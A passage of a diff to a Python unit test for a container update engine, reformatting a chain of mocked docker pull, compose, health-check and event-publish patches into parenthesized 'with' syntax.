-             patch("app.services.compose_parser.ComposeParser.update_compose_file", AsyncMock(return_value=True)), \
-             patch.object(UpdateEngine, "_pull_docker_image", AsyncMock(return_value={"success": True})), \
-             patch.object(UpdateEngine, "_execute_docker_compose", AsyncMock(return_value={"success": True})), \
-             patch.object(UpdateEngine, "_validate_health_check", AsyncMock(return_value={"success": True, "method": "http_check"})), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", capture_event):
-
+        with (
+            patch.object(
+                UpdateEngine,
+                "_backup_compose_file",
+                AsyncMock(return_value="/data/backups/test"),
+            ),
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                AsyncMock(return_value=True),
+            ),
+            patch.object(
+                UpdateEngine,
+                "_pull_docker_image",
+                AsyncMock(return_value={"success": True}),
+            ),
+            patch.object(
+                UpdateEngine,
+                "_execute_docker_compose",
+                AsyncMock(return_value={"success": True}),
+            ),
+            patch.object(
+                UpdateEngine,
+                "_validate_health_check",
+                AsyncMock(return_value={"success": True, "method": "http_check"}),
+            ),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", capture_event),
+        ):
             await UpdateEngine.apply_update(mock_db, 1, "user")
 
             # Should have published 'update-complete' event with status='success'
